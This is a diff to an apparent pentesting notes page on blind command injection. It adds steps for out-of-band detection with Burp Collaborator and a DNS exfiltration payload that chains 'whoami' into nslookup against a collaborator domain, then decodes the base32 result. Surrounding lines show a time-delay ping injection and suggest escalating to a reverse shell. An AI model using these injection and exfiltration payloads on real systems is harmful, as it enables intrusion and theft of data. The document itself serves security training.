@@ -57,10 +57,50 @@ google.com; ping -c11 127.0.0.1 #server will hang for roughly 10 seconds
 
 <figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
 
 * This proves blind cmd injection, escalate to reverse shell
 
 ### Burp Collaborator
 
-*
+* Launch Burp, and choose:
+
+![](<../.gitbook/assets/image (9).png>)
+
+```
+Burp --> Burp Collaborator Client
+Press --> "Copy to Clipboard" #to copy a randomly generated domain name
+Execute your cmd injection
+```
+
+* Press `Poll Now` to see if the request came through&#x20;
+
+<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+### **Data Exfil via DNS and Burp Collaborator**&#x20;
+
+* Once you have your Burp Collaborator Domain, try your command injection&#x20;
+
+```
+google.com; a=$(whoami|base32|tr -d =); nslookup $a.COLLAB_DOMAIN_NAME.com
+```
+
+* Press Poll now and you should have something returned like this:
+
+```
+O53XOLLEMF2GCCQ.323lijijf90304jklksjru43k23.oastify.com
+```
+
+* Then type the following in your local terminal&#x20;
+
+```
+echo -n O53XOLLEMF2GCCQ | wc -c
+```
+
+* If this fails as `Invalid Base32` add 1, or 2 equal signs at the end for padding
+
+```
+echo -n O53XOLLEMF2GCCQ= | base32 -d
+#output:
+www-data
+```
